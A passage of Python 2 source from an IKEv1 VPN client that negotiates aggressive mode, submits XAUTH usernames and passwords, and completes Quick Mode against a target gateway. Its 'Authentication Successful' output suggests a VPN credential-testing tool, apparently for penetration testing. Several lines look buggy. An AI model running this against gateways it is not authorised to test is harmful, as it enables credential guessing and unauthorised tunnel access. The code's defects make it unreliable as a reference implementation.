			bytesIKE = ikeneg.packPacket(arrayIKE)

			#Send packet
			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
			dicCrypto["p2IV"] = bytesIKE.encode('hex')[-IVlen:]
                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]#p2IV and last block are the same at this point
			count = 0
			status = "p1_am3"
			while len(packets) < 2:
				time.sleep(0.5)
				count += 1
				if count > 15:
					#print "No further responses received.\nExiting...\n"
					#Added attempt to begin Quick Mode here if no response is received. Typical behaviour if XAuth is not enabled on the responder
		                        if debug > 0:
		                        	print "\n--------------------Sending Quick Mode Packet 1------------------"
					msgID = "00001112"
					dicCrypto["msgID"] = msgID
					p2IV = dicCrypto["p2IV"]
					curIV = p2IV.decode('hex')
		
					#Process response packet
					#Transform set
			                xType = "20" #Quick Mode
					phase = 2
					transID = "0c" #currently static 3 - ENCR_3DES, 12 (0c) - aes-cbc
		
					#Transform payload
					arrayTrans = ikeneg.ikeTransform(encType,"01",authType,DHGroup,"01","00007080",transID,phase,"00")
					bytesTrans = ikeneg.packPacket(arrayTrans)
					#Proposal Payload
					arrayProposal = ikeneg.ikeProposal(bytesTrans.encode('hex'), "02", phase)
					bytesProposal = ikeneg.packPacket(arrayProposal)
					#SA Payload
					arraySA = ikeneg.ikeSA(bytesProposal.encode('hex'))
					bytesSA = ikeneg.packPacket(arraySA)
					#arraySA_i = arraySA[4:]
					#SA_i = self.packPacket(arraySA_i).encode('hex')
					SA_i = bytesSA.encode('hex')
		
					arrayNonce,nonce = ikeneg.ikeNonce("0d")
					bytesNonce = ikeneg.packPacket(arrayNonce)
		
					#Pull IP from previous Mode CFG transaction
					mcfgIP = str(dicCrypto["MCFG_IPi"]).decode('hex')
					#mcfgIP = "c0a801eb".decode('hex')
		
		        		#ID payload
		        		arrayID,ID_i = ikeneg.ikeID(mcfgIP.encode('hex'),"01","0000","00","05")#next payload = ID (5), 0000 = port
					bytesID = ikeneg.packPacket(arrayID)
		
		                        #ID payload
		                        arrayID1,ID_i1 = ikeneg.ikeID("0000000000000000","04","0000","00","00")#next payload = none (0), 04 = idtype, 0000 = port # next payload = 0d - vid
					bytesID1 = ikeneg.packPacket(arrayID1)
		
				        #VID payload
		        		arrayVID = ikeneg.ikeVID("05","09002689dfd6b712")
					bytesVID = ikeneg.packPacket(arrayVID)
		
					qmData = bytesSA+bytesNonce+bytesVID+bytesID+bytesID1
					
					###***change below strings to properly built payloads, perhaps allow the phase 2 transform to be specified by the user?
					qmData = "0a00020400000001000000010200002c000304010b36f8fb00000020000c000080060100800400018005000280010001000200040020c49b0200002c010304010b36f8fb00000020000c000080060100800400018005000180010001000200040020c49b0200002c020304010b36f8fb00000020000c0000800600c0800400018005000280010001000200040020c49b0200002c030304010b36f8fb00000020000c0000800600c0800400018005000180010001000200040020c49b0200002c040304010b36f8fb00000020000c000080060080800400018005000280010001000200040020c49b0200002c050304010b36f8fb00000020000c000080060080800400018005000180010001000200040020c49b02000028060304010b36f8fb0000001c00030000800400018005000280010001000200040020c49b02000028070304010b36f8fb0000001c00030000800400018005000180010001000200040020c49b02000028080304010b36f8fb0000001c00020000800400018005000280010001000200040020c49b02000028090304010b36f8fb0000001c00020000800400018005000180010001000200040020c49b020000280a0304010b36f8fb0000001c000b0000800400018005000280010001000200040020c49b000000280b0304010b36f8fb0000001c000b0000800400018005000180010001000200040020c49b050000185b3693728fb19dab4d3cb0fa90e64f9e1f57753e0500000c01000000c0a801fb00000010040000000000000000000000".decode('hex')# 00000000"
					nonce = "5b3693728fb19dab4d3cb0fa90e64f9e1f57753e"
					lenQMData = len(qmData)
					arrayqmData = array.array('B', qmData)
					bytesqmData = struct.pack(("B"*len(arrayqmData)),*arrayqmData)
					#plainPayload = ikeCrypto.calcPadding(encType, qmData)
		
					#plainPayload = ikeCrypto.calcPadding(encType, bytesHash+qmData)
					#qmData = plainPayload
					print skeyid_a.encode('hex')
		                        hash_1 = ikeCrypto.calcHASHQM(skeyid_a, msgID.decode('hex'), qmData, hashType, 1)
		                        arrayHash = ikeneg.ikeHash("01",hash_1)#next payload 01
					bytesHash = ikeneg.packPacket(arrayHash)
		
		                        #Encrypt everything but the header
					curIV = ikeCrypto.calcIV(p2IV.decode('hex'), msgID.decode('hex'), IVlen, hashType)
		                        plainPayload = ikeCrypto.calcPadding(encType,bytesHash+bytesqmData)
		                        if debug > 0:
		                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
		                        #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
		                        cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
					encPayload = cipher.encrypt(plainPayload)
		
		                        if debug > 0:
		                                print "Encrypted Payload: %s"%encPayload.encode('hex')
			
						
					payloads = arrayencPayload = array.array('B', encPayload)
					payloads = ikeneg.packPacket(arrayencPayload)
					arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,payloads.encode('hex'))
					bytesIKE = ikeneg.packPacket(arrayIKE)
		
		
					#Send QM packet 1
		        	        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
		        	        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
		                        count = 0
					status = "p2_qm1"
		                        while len(packets) < 5:
		                                time.sleep(0.01)
		                                count += 1
		                                if count > 500:
		                                        print "No further responses received.\nExiting...\n"
							exit()
		
		
		
		                #if len(packets) == 5:
		                        #Process Header first
		                        ikeHandling = ikehandler.IKEv1Handler(debug)
		                        ikeHDR = ikeHandling.parseHeader(packets[-1])
					#dicCrypto["lastBlock"] = packets[-1][-IVlen:]
		                        #Check the packet is for this session
		                        if ikeHDR[1] == dicCrypto["iCookie"]:
		                                pass
		                        else:
		                                print "Packet received does not match this session, this is probably from a previous incarnation."
		                                del packets[-1]
		                                print "Removing packet"
		                                continue
		
		                        try:
		                                if ikeHDR[5] == dicCrypto["msgID"]:
		                                        if debug > 0:
		                                                print "Message ID has not changed"
		                                        curIV = dicCrypto["lastBlock"].decode('hex')
		                                        pass
		                                else:
		                                        if debug > 0:
		                                                print "Message ID has changed, recalculating IV"
		                                        msgID = ikeHDR[5]
		                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
		                                        pass
		                        except:
		                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
		                                time.sleep(2)
		                                exit()
		
		
		                        if ikeHDR[4] == 5:
		                                print "Informational packet received. Enable full debugging for more info. Exiting..."
						try:
							respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
		                                except:
							respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
		                                #time.sleep(2)
		                                #exit()
		                        if ikeHDR[4] == 6:
		                                print "QUICK MODE FAILED! PACKET MALFORMED?"
		                                exit()
		                        else:
		                                pass
		
		                        #Process full packet
		                        respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
		                        #Update state/crypto dictionary
		                        dicCrypto.update(respDict)
					dicCrypto["lastBlock"] = packets[-1][-IVlen:]
		
		                        if debug > 0:
		                                print "\n--------------------Sending Quick Mode Packet 3------------------"
					#Send QM 3 packet
					#For QM hash 3 data = Nonce_i | Nonce_r (from phase 2 negotiations - not phase 1 nonces)
					nonce_r = dicCrypto["nonce_r"]
					nonces = nonce+nonce_r
		                        hash_3 = ikeCrypto.calcHASHQM(skeyid_a, msgID.decode('hex'), nonces.decode('hex'), hashType, 3)
		                        arrayHash = ikeneg.ikeHash("00",hash_3)#next payload 00
					bytesHash = ikeneg.packPacket(arrayHash)
					
		                        #Encrypt everything but the header
					curIV = dicCrypto["lastBlock"].decode('hex')
		                        plainPayload = ikeCrypto.calcPadding(encType,bytesHash)
		                        if debug > 0:
		                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
		                        #Encryption/decryption uses last block from previous encrypted payload (CBC) except $
		                        cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
		                        encPayload = cipher.encrypt(plainPayload)
		
		                        if debug > 0:
		                                print "Encrypted Payload: %s"%encPayload.encode('hex')
		
		                        arrayencPayload = array.array('B', encPayload)
					bytesencPayload = ikeneg.packPacket(arrayencPayload)
		
		                        arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload 0 = none
					bytesIKE = ikeneg.packPacket(arrayIKE)
		
		                        #Send QM packet 3
		                        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
		                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
					prot = "03"
					print "Phase 2 Complete!"
					spi = dicCrypto["spi"]
					print "-----------------SA-----------------"
					print "|SPI (Outbound): 036f8fb     |"#static currently
					print "|SPI (Inbound): %s            |"%spi
					print "|Encryption Type: %s        |"%dicCrypto["Encryption Type"]
					print "|Authentication Algorithm: %s|"%dicCrypto["Authentication Algorithm"]
					print "|SA Life Duration: %s        |"%dicCrypto["SA Life Duration"]
					print "|SA Life Type: %s                 |"%dicCrypto["SA Life Type"]
		
		
					p2key = ikeCrypto.calcKEYMAT(hashType, keyLen, skeyid_d, prot.decode('hex'), spi.decode('hex'), nonce.decode('hex'), nonce_r.decode('hex'))
		                        while len(packets) < 6:
		                                time.sleep(0.01)
		                                count += 1
		                                if count > 7080:
		                                        print "No further responses received.\nExiting...\n"
							exit()
		
		
				#elif len(packets) > 5:
		                        #Process Header first
		                        ikeHandling = ikehandler.IKEv1Handler(debug)
		                        ikeHDR = ikeHandling.parseHeader(packets[-1])
					#dicCrypto["lastBlock"] = packets[-1][-IVlen:]
		                        #Check the packet is for this session
		                        if ikeHDR[1] == dicCrypto["iCookie"]:
		                                pass
		                        else:
		                                print "Packet received does not match this session, this is probably from a previous incarnation."
		                                del packets[-1]
		                                print "Removing packet"
						pass
		                                continue
		
		                        try:
		                                if ikeHDR[5] == dicCrypto["msgID"]:
		                                        if debug > 0:
		                                                print "Message ID has not changed"
		                                        curIV = dicCrypto["lastBlock"].decode('hex')
		                                        pass
		                                else:
		                                        if debug > 0:
		                                                print "Message ID has changed, recalculating IV"
		                                        msgID = ikeHDR[5]
		                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
		                                        pass
		                        except:
		                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
		                                time.sleep(2)
		                                exit()
		
		
		                        if ikeHDR[4] == 5:
		                                
						respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
						if int(dicCrypto["notmsgType"]) == 36136:
							if debug > 0:
								print "DPD payload received, sending heartbeat response"
		
							ikeneg = ikeclient.IKEv1Client(debug)
							ikeCrypto = crypto.ikeCrypto()
							xType = "05"
							notData = "AAAAAAAA"
							msgType = hex(36137)[2:]#R-U-THERE-ACK		
							arrayDPD = ikeneg.ikeNot("00",msgType,spi,notData)
							bytesDPD = ikeneg.packPacket(arrayDPD)
		
				                        #hash = ikeCrypto.calcHASH(skeyid_a, msgID.decode('hex'),qmData, hashType, 1)
							#hash_i = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'
		                		        #arrayHash = ikeneg.ikeHash("01",hash_1)#next payload 01$
		                        		#lenHash = len(arrayHash)
		                        		#bytesHash = struct.pack(("B"*lenHash),*arrayHash)
		
		 					arrayIKE = ikeneg.ikeHeader("0b",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))
							bytesIKE = ikeneg.packPacket(arrayIKE)
		
		                        		#Send DPD packet
		         










					time.sleep(2)
					#exit()
                 
                if len(packets) == 2:
			#Parse the header first
		        ikeHandling = ikehandler.IKEv1Handler(debug)
		        ikeHDR = ikeHandling.parseHeader(packets[-1])
			#Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                        	pass
                        else:
                                print "Packet received does not match this session, this is probably from a previous incarnation.5"
                                del packets[-1]
				print len(packets)
				print packets[-1]
                                print "Removing packet"  
                                continue

                        try:   
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"

                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass    
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

                        #Check for informational packet
                        if ikeHDR[4] == 5:
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
				except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
				print "Informational packet received. Enable full debugging for more info. Exiting..."
                                time.sleep(2)
                                exit()
                        else:
                                pass


                        #Check for informational packet
                        if ikeHDR[4] == 5:
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                                except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
				print "Informational packet received. Enable full debugging for more info. Exiting..."
                                time.sleep(2)
                                exit()
                        else:
                                pass

			#Parse full packet
			respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
			#Update state/crypto dictionary
			dicCrypto.update(respDict) 
			dicCrypto["lastBlock"] = packets[-1][-IVlen:]

                        #Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
                        nonce_r = dicCrypto["nonce_r"]
                        ID_i = dicCrypto["ID_i"]
                        ID_r = dicCrypto["ID_r"]
                        rCookie = dicCrypto["rCookie"]
			iCookie = dicCrypto["iCookie"]
                        msgID = dicCrypto["msgID"]
                        privKey = dicCrypto["privKey"] 
                        DHPubKey_r = dicCrypto["DHPubKey_r"]
                        SA_i = dicCrypto["SA_i"]
			xType = int(dicCrypto["xType"])
                        if xType != 6:
                                print "Expected Mode Config Transaction packet."
                                print "Exiting...\n"
				
				time.sleep(1)
                                exit()
			else:
				pass

            
			#Process response packet
                        print "\n--------------------Sending third packet - Encrypted XAUTH reply (username: %s password: %s)--------------------"%(username,password)
                        xType = "06" #Mode Config transaction
                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
                        mcfgAtts = userXAUTH+passXAUTH 

                        #Mode Config payload   
                        arrayMCFG = ikeneg.ikeModeCFG("00","02",mcfgAtts) #02 = mode config Reply
			bytesMCFG = ikeneg.packPacket(arrayMCFG)

                        #Hash payload
                        skeyid_a = dicCrypto["skeyid_a"]
                        mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                        if debug > 0:
                                print "Mode Config Hash = %s"%mcfgHash
                        arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
			bytesHash = ikeneg.packPacket(arrayHash)

                        #Encrypt everything but the header
                        plainData = (bytesHash+bytesMCFG)
                        plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        if debug > 0:
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')

                        #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                        cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
                        encPayload = cipher.encrypt(plainPayload)

                        if debug > 0:
                                print "Encrypted Payload: %s"%encPayload.encode('hex')

                        arrayencPayload = array.array('B', encPayload)
			bytesencPayload = ikeneg.packPacket(arrayencPayload)
                        arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
			bytesIKE = ikeneg.packPacket(arrayIKE)

                        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]

			time.sleep(speed)
			while len(packets) < 2:
				time.sleep(0.5)

		if len(packets) == 3:
			#Process Header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:   
                                print "Packet received does not match this session, this is probably from a previous incarnation.6"
                                del packets[-1]
                                print "Removing packet"
                                continue

                        try:   
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"

                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass    
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                                except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
                                time.sleep(2)
                                exit()
                        else:
                                pass

			#Process full packet
                        respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        #Update state/crypto dictionary
                        dicCrypto.update(respDict)

			#Check response and send ACK if successful
                       	if dicCrypto["mcfgType"] == "03" or int(dicCrypto["mcfgType"]) == 3 and int(dicCrypto["XAUTH_STATUS"]) == 1:
				print "[*]XAUTH Authentication Successful! Username: %s Password: %s\nSending ACK packet...\n"%(username,password)

                	        #Mode Config payload - ACK
				###***EDIT
				"""
				if vendorType == "watchguard":
					msgID = dicCrypto["msgID"]
				else:
					msgID = "0000111a"
					dicCrypto["msgID"] = msgID
				"""
				msgID = dicCrypto["msgID"]
				###/EDIT

				if debug > 0:
					print "\n--------------------Sending fourth packet - Encrypted XAUTH ACK --------------------"
				if vendorType == "cisco" or "watchguard":
		        	        ackXAUTH = ikeneg.ikeXAUTH(0,16527,1,"cisco")
				else:
					ackXAUTH = ikeneg.ikeXAUTH(0,16527,1)
                       	        mcfgAtts = ackXAUTH
	        	        arrayMCFG = ikeneg.ikeModeCFG("00","04",mcfgAtts) #04 = Mode Config ACK
				bytesMCFG = ikeneg.packPacket(arrayMCFG)

                                #Hash payload
                                skeyid_a = dicCrypto["skeyid_a"]
                                mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                                if debug > 0:
                                	print "Mode Config Hash = %s"%mcfgHash
                                arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
				bytesHash = ikeneg.packPacket(arrayHash)

                                #Encrypt everything but the header
                                plainData = (bytesHash+bytesMCFG)
                                plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                if debug > 0:
                                	print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
				dicCrypto["lastBlock"] = packets[-1][-IVlen:]
				curIV = dicCrypto["lastBlock"].decode('hex')

                                cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                encPayload = cipher.encrypt(plainPayload)

                                if debug > 0:
                                	print "Encrypted Payload: %s"%encPayload.encode('hex')

                                arrayencPayload = array.array('B', encPayload)
				bytesencPayload = ikeneg.packPacket(arrayencPayload)
                                arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
                                bytesIKE = ikeneg.packPacket(arrayIKE)

                                #Send ACK packet
                                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                                dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
				#time.sleep(1)
				
				#Request IP address etc
                                #Mode Config payload - REQ
                                msgID = "0000111b"
				dicCrypto["msgID"] = msgID
                                if debug > 0:
                                        print "\n--------------------Sending fifth packet - Encrypted Mode CFG REQ --------------------"
				"""
                                if vendorType == "cisco" or "watchguard":
                                        ackXAUTH = ikeneg.ikeXAUTH(0,16527,1,"cisco")
                                else:
                                        ackXAUTH = ikeneg.ikeXAUTH(0,16527,1)
				"""
				#static mode cfg value for now, this just requests internal IP address etc.
                                #mcfgAtts = "00010000000200000003000000040000700200007008000c80010001800200018003000270070000700000007001000070040000700a00046b616c690007000018436973636f2053797374656d732056504e20436c69656e7420302e352e33723531323a4c696e75780000000000000000"
				mcfgAtts = "00010000000200000003000000040000700200007008000c80010001800200018003000270070000700000007001000070040000700a00046b616c69"
                                arrayMCFG = ikeneg.ikeModeCFG("00","01",mcfgAtts) #01 = Mode Config REQUEST
				bytesMCFG = ikeneg.packPacket(arrayMCFG)

                                #Hash payload
                                skeyid_a = dicCrypto["skeyid_a"]
                                mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                                if debug > 0:
                                        print "Mode Config Hash = %s"%mcfgHash
                                arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
				bytesHash = ikeneg.packPacket(arrayHash)

                                #Encrypt everything but the header
                                plainData = (bytesHash+bytesMCFG)
                                plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                if debug > 0:
                                        print "Plain-text Payload: %s"%plainPayload.encode('hex')



                                #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                encPayload = cipher.encrypt(plainPayload)

                                if debug > 0:
                                        print "Encrypted Payload: %s"%encPayload.encode('hex')

                                arrayencPayload = array.array('B', encPayload)
				bytesencPayload = ikeneg.packPacket(arrayencPayload)
                                arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
				bytesIKE = ikeneg.packPacket(arrayIKE)
                                #Send REQ packet
                                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                                dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
                            	while len(packets) < 1:
                                	time.sleep(1)
                                	if countTime > 20:
                                        	break
                                    	countTime += 1
                                time.sleep(5)
				continue

				"""
				#Close the tunnel
				msgID = "0000111a"
				dicCrypto["msgID"] = msgID
                                xType = "05" #Informational
                                #Process Delete payload
                                #Hash payload   
                                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
				bytesHash = ikeneg.packPacket(arrayHash)

                                #Delete payload
                                if debug > 0:
                                	print "\n--------------------Sending Delete Packet--------------------"
                                arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
				bytesDel = ikeneg.packPacket(arrayDel)

                                #Encrypt everything but the header
                                plainData = (bytesHash+bytesDel)
                                plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                if debug > 0:
                                	print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                #Calc message ID and current IV
                                msgID = "0000111b"
				dicCrypto["msgID"] = msgID
                                curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                encPayload = cipher.encrypt(plainPayload)

                                if debug > 0:
                                	print "Encrypted Payload: %s"%encPayload.encode('hex')

                                arrayencPayload = array.array('B', encPayload)
				bytesencPayload = ikeneg.packPacket(arrayencPayload)
                                arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
				bytesIKE = ikeneg.packPacket(arrayIKE)

                                #Send Delete payload
                                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)

				"""


			if dicCrypto["mcfgType"] == "03" or int(dicCrypto["mcfgType"]) == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:              
				print "Mode Config STATUS message received - Authentication Unsuccessful"
				#Process response packet
				if debug > 0:
		                        print "\n--------------------Sending fourth packet - Encrypted XAUTH ACK (username: %s password: %s)--------------------"%(username,password)
	                        xType = "06" #Mode Config transation
				#Hash Payload
	                        skeyid_a = dicCrypto["skeyid_a"]
	                        mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                        	if debug > 0:
                        	        print "Mode Config Hash = %s"%mcfgHash
                        	arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
				bytesHash = ikeneg.packPacket(arrayHash)

                        	#Encrypt everything but the header
                        	plainData = (bytesHash+bytesMCFG)
                        	plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        	if debug > 0:
                        	        print "Plain-text Payload: %s"%plainPayload.encode('hex')

                        	#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                        	cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
                        	encPayload = cipher.encrypt(plainPayload)

                        	if debug > 0:
                        	        print "Encrypted Payload: %s"%encPayload.encode('hex')
	
        	                arrayencPayload = array.array('B', encPayload)
				bytesencPayload = ikeneg.packPacket(arrayencPayload)
        	                arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
				bytesIKE = ikeneg.packPacket(arrayIKE)
				
				#Send ACK packet
        	                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
        			dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]


                                xType = "05" #Informational
                                #Process Delete payload
                                #Hash payload
                                if debug > 0:
                                        print "Sending Delete payload to reset connection"
                                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
				bytesHash = ikeneg.packPacket(arrayHash)

                                #Delete payload
                                arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
				bytesDel = ikeneg.packPacket(arrayDel)

                                #Encrypt everything but the header
                                plainData = (bytesHash+bytesDel)
                                plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                if debug > 0:
                                        print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                #Calc message ID and current IV
                                msgID = "0000111b"
				dicCrypto["msgID"] = msgID
				curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                encPayload = cipher.encrypt(plainPayload)
                                if debug > 0:
                                        print "Encrypted Payload: %s"%encPayload.encode('hex')

                                arrayencPayload = array.array('B', encPayload)
				bytesencPayload = ikeneg.packPacket(arrayencPayload)
                                arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
				bytesIKE = ikeneg.packPacket(arrayIKE)

                                #Send Delete payload
                                bytesIKE = bytesHDR+bytesencPayload
                                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
				#del packets[-2]
                        	time.sleep(10)
				continue
			
                        if dicCrypto["mcfgType"] == "01" or dicCrypto["mcfgType"] == 1:
                                print "XAUTH Authentication Failed. Exiting..."
                                exit()


                        else:
                                if debug > 0:
                                        print "Still receiving packets, but exiting..."
                                dicCrypto["lastBlock"] = packets[-1][-IVlen:]
                                curIV = bytesIKE.encode('hex')[-IVlen:]
                                #del packets[-2]
                                time.sleep(5)
                                exit()




		if len(packets) == 4:
			#Process Header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:   
                                print "Packet received does not match this session, this is probably from a previous incarnation.6"
                                del packets[-1]
                                print "Removing packet"
                                continue
			
			if dicCrypto["mcfgType"] == "01":
				print "XAUTH Authentication Failed. Exiting..."
				exit()

                        try:   
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"

                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass    
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                                except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
                                time.sleep(2)
                                exit()

                        else:
                                pass

			#Process full packet
                        respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        #Update state/crypto dictionary
                        dicCrypto.update(respDict)
			#exit()

			#Need to move into phase 2 with quick mode handshake here
                        if debug > 0:
                        	print "\n--------------------Sending Quick Mode Packet 1------------------"
			msgID = "0000111c"
			dicCrypto["msgID"] = msgID
			p2IV = dicCrypto["p2IV"]

			#Process response packet
